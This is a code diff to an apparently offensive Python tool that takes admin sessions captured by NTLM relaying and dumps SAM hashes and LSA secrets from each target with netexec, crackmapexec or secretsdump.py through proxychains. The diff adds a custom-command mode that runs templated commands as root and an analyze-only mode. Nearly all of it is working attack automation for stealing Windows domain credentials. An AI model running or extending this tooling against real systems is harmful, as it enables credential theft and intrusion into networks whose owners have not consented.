@@ -9,6 +9,7 @@ from datetime import datetime
 import concurrent.futures
 import readline
 import argparse
+from argparse import RawTextHelpFormatter
 import time
 
 color_RED = '\033[91m'
@@ -17,6 +18,7 @@ color_YELL = '\033[93m'
 color_BLU = '\033[94m'
 color_PURP = '\033[35m'
 color_reset = '\033[0m'
+blue_plus = "{}[+]{}".format(color_BLU, color_reset)
 green_plus = "{}[+]{}".format(color_GRE, color_reset)
 red_minus = "{}[-]{}".format(color_RED, color_reset)
 gold_plus = "{}[+]{}".format(color_YELL, color_reset)
@@ -62,7 +64,7 @@ def config_check():
     print('\n{}[{}Config looks good{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
 
 
-def mt_execute(username, ip, method, secretsdump_path, local_uname):
+def mt_execute(username, ip, method, secretsdump_path, local_uname, custom_command):
 
     print('{} Dumping {} via user {}'.format(gold_plus, ip, username))
 
@@ -81,6 +83,13 @@ def mt_execute(username, ip, method, secretsdump_path, local_uname):
         os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
         print('{} sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(timestamp(), local_uname, ip, username.split('/')[1], username.split('/')[0]))
         os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+
+    elif method == 'custom':
+        custom_command = custom_command.replace('[IP]', ip)
+        custom_command = custom_command.replace('[DOMAIN]', username.split('/')[0])
+        custom_command = custom_command.replace('[USERNAME]', username.split('/')[1])
+        print('{} {}'.format(timestamp(), custom_command))
+        os.system(custom_command)
 
     with open('{}/dumped_ips'.format(cwd), 'a') as f:
         f.write(ip + '\n')
@@ -108,30 +117,64 @@ def check_uname():
             given_username = input('Username: ')
 
 if __name__ == '__main__':
+
     if os.geteuid() != 0:
         print("{} Must be run as sudo".format(red_exclm))
         sys.exit(1)
 
-    parser = argparse.ArgumentParser(add_help=True)
-    parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump', 'netexec'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
+    parser = argparse.ArgumentParser(add_help=True, epilog='Custom arguments for the custom method\nUsername = [USERNAME]\nIP = [IP]\nDomain = [DOMAIN]\n\nAn example command should look like\nproxychains python3 secretsdump.py [DOMAIN]/[USERNAME]:''@[IP] -no-pass\n\nIMPORTANT\nIf you dont add "sudo -u a_username" the command will run as root\nIf you dont add proxychains its gonna fail', formatter_class=RawTextHelpFormatter)
+    parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump', 'netexec', 'custom'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
     parser.add_argument('-sdp', action='store', help='Path to secretsdump.py file (only used if -method is secretsdump) Example -sdp /opt/impacket/examples/secretsdump.py')
     parser.add_argument('-threads', action='store', type=int, default=1, help='Number of threads to use Default=1 I recommend useing 1 as ntlmrelayx will sometimes lose a relay if you use more than 1 idk why')
     parser.add_argument('-ar', action='store_true', help='Auto-retry when enabled runs constantly until ctrl+c is hit')
+    parser.add_argument('-A', action='store_true', help='Analyze mode: Will not do anything but print new admin relays')
+    parser.add_argument('-cc', action='store', help='Custom command argument for -method custom: This is to run a user specified command Note this will run as sudo unless you add  "sudo -u username" to the beginning of your command')
+
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
 
     options = parser.parse_args()
 
-    if options.method == 'secretsdump' and options.sdp is None:
+    if options.A == False:
+        print('{} Dumped IPs file will be located at {}/dumped_ips'.format(blue_plus, cwd))
+
+    if options.method == 'custom' and options.cc is None: # ensure if they are using a custom command that they specify one
+        print('The method custom requires -cc with a command for ex -cc netexec smb [IP] -u [USERNAME] -p \'\' -d [DOMAIN] --sam')
+        sys.exit(1)
+
+    if options.method == 'custom' and options.cc is not None: # see if the user understands that they are running as root
+        if options.cc.find('sudo -u') == -1:
+            q = input('You seem to be using a custom command and running it without specifying a user with sudo -u username are you sure you want to do this it will run as root. (y/N) ')
+            if q.lower() != 'y':
+                sys.exit(1)
+
+    if options.method == 'custom' and options.cc is not None: # see if the user understands that they are running without proxychains
+        if options.cc.find('proxychains') == -1:
+            q = input('You seem to be using a custom command and running it without proxychains. Unless you are proxying your traffic to port 1080 some other way its gonna fail. Do you want to continue? (y/N) ')
+            if q.lower() != 'y':
+                sys.exit(1)
+
+    if options.method == 'custom' and options.cc is not None: # see if the user understands that they are running as root
+        if options.cc.find('[IP]') == -1 and options.cc.find('[DOMAIN]') == -1 and options.cc.find('[USERNAME]') == -1:
+            q = input('You seem to be using a custom command and did not specify all 3 custom flags are you sure you want to run this? (y/N) ')
+            if q.lower() != 'y':
+                sys.exit(1)
+
+    if options.method == 'secretsdump' and options.sdp is None: # secretsdump path
         print('You must enter a path for secretsdump.py')
         sys.exit(1)
 
     if not os.path.isdir("{}/loot".format(cwd)):
         os.makedirs("{}/loot".format(cwd))
 
-    config_check()
+    if options.A == False:
+        config_check()
 
     attack_uname = ''
     if options.method == 'crackmapexec' or options.method == 'netexec':
-        attack_uname = check_uname()
+        if options.A == False:
+            attack_uname = check_uname()
 
     if options.method == 'secretsdump' and os.path.isfile(options.sdp) == False:
         print('Missing secretsdump.py')
@@ -184,7 +227,10 @@ if __name__ == '__main__':
 
                                     # lsa secrets and sam dump courtesy of secretsdump
                                     try:
-                                        executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, attack_uname)
+                                        if not options.A:
+                                            executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, attack_uname, options.cc)
+                                        else:
+                                            print(f"Administrative relay {dat[2]} {dat[1]}")
                                     except Exception as e:
                                         print(str(e))
                                         print('Error dumping secrets')
